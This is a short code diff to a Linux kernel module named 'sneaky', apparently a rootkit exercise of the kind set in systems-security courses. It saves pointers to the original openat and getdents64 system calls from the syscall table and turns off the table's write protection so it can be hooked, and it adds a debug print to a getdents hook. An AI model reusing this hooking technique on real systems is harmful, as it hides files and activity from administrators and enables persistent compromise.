@@ -60,6 +60,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
+
 asmlinkage int (*original_getdents64)(struct pt_regs *);
 
 asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
@@ -73,6 +74,7 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent64 * dir
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent64 * dirp, unsigned int count)
 {
+  printk(KERN_INFO "Here");
   return  (*original_getdents)(fd, dirp, count);
 }
 **/ 
@@ -91,7 +93,8 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
-  
+  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
+   
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
